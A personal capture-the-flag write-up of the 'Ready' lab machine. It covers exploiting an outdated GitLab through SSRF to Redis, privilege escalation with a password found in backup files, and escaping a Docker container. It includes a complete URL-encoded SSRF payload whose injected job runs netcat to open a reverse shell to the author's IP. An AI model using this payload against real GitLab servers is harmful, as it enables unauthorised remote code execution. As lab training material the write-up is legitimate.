# Ready

Ready

Monday, 21 February 2022

2:23 pm

This is a Linux machine.

The target IP is 10.10.10.220.

My IP is 10.10.16.9.

&#x20;

Nmap scan this thing first.

It determines two ports, a HTTP and SSH port.

&#x20;

!\[\[48\_Ready\_image001.png]]

&#x20;

Visiting the web page gives us this sign in page.

!\[\[48\_Ready\_image002.png]]

Interesting, so we have some kind of GitLab here, and there are few vulnerabilities for RCEs that involve authentication.

&#x20;

Seems that we have to sign in before doing anything. I tried to create an account with the password as 'password'.

&#x20;

!\[\[48\_Ready\_image003.png]]

From here it shows me a search button and gives me some form of GUI.

!\[\[48\_Ready\_image004.png]]

&#x20;

Seems that it displays the search query there. Within the help section, I found the version number of this.

&#x20;

!\[\[48\_Ready\_image005.png]]

Seems that it's outdated.

There are multiple different kinds of exploits for this version. However, I went with the manual method.

&#x20;

Watch [this video](https://www.youtube.com/watch?v=LrLJuyAdoAg\&feature=emb\_imp\_woyt) to understand how it works.

This is the same exploit that would be done.

So how this will be done is:

1. Click on new project
2. Import project.

!\[\[48\_Ready\_image006.png]]

1. Repo by URL.

!\[\[48\_Ready\_image007.png]]

&#x20;

1. Put this payload (be sure to cahnge the IP and port number.

> git://\[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%2010%2E10%2E16%2E9%209001%20%2de%20%2fbin%2fbash%20%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git
>
> &#x20;

1. Create project and get a reverse shell.

> !\[\[48\_Ready\_image008.png]]

&#x20;

From here, we need to PE. But first, get the user flag which this user has access to.

&#x20;

Get linpeas into this and run it accordingly.

&#x20;

Here are some interesting things I saw:

!\[\[48\_Ready\_image009.png]]

&#x20;

{width="12.1875in" height="5.427083333333333in"}

This one points towards keys and stuff...?

&#x20;

!\[\[48\_Ready\_image0011.png]]

&#x20;

!\[\[48\_Ready\_image0012.png]]

There seem to be whole private keys given as well. But, I first wanted to check out these gitlab files.

&#x20;

I searched each file for passwords.

While In /opt, I came across the backup files, which contained this.

&#x20;

!\[\[48\_Ready\_image0013.png]]

&#x20;

I tried that password. Which actually worked LOL.

!\[\[48\_Ready\_image0014.png]]

Pwned...or so I thought.\
For some reason, there is no root.txt file...

!\[\[48\_Ready\_image0015.png]]

Odd...clearly this is intended or something.

Clearly, I'm not actually root of the entire file system. Perhaps I could be inside a mounted drive?

We need to check whether or not I'm inside of a docker or something.

&#x20;

Going back to my linpeas scan, I found these.

&#x20;

!\[\[48\_Ready\_image0016.png]]

That dockerenv kinda hints that we are mounted somehow.

There's a root pass however.

!\[\[48\_Ready\_image0017.png]]

&#x20;

I tried using SSH to access this machine root. It does not work.

I found out I could not access the root directory, so I can't even add my SSH key into the authorized\_keys.

&#x20;

Upon analysing the process list, I can see that there is no key processes. Take a look at the one I have on the machine and my Kali machine.

&#x20;

{width="7.8125in" height="2.8854166666666665in"}

&#x20;

!\[\[48\_Ready\_image0019.png]]

No essential services are present.

&#x20;

Hence we need to break out of this container somehow.

&#x20;

I identified that lsblk is the method used to check mounts. This is what I got.

&#x20;

{width="5.03125in" height="2.9166666666666665in"}

&#x20;

So sda2 looks like the main disk.

So let's mount that disk into a directory.

!\[\[48\_Ready\_image0021.png]]

&#x20;

From here, we should be able to get the root flag.

&#x20;

Now, I want to break out of this for good, because we are still stuck within this container.

We need to understand how docker works first.

!\[\[48\_Ready\_image0022.png]]

&#x20;

So we need to escape this docker somehow. [This website](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/) explains it pretty well.

This kind of works, and I get this.

&#x20;

!\[\[48\_Ready\_image0023.png]]

This would lead to a root shell!

Alright, time to move on.

&#x20;

Good box!
